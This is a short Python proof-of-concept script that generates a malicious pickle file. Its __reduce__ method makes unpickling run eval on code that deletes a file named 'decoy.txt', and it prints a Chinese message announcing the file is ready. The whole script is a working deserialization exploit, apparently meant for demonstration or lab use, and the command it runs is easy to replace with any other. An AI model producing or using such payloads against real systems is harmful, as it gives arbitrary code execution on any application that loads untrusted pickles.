import pickle

class MaliciousPayload:
    def __reduce__(self):
        code = "__import__('os').remove('decoy.txt')"
        return (eval, (code,))

def generate_pickle():
    payload = MaliciousPayload()
    
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(payload, f)
    
    print("[+] 恶意 pickle 文件已生成: malicious.pickle")

if __name__ == "__main__":
    generate_pickle()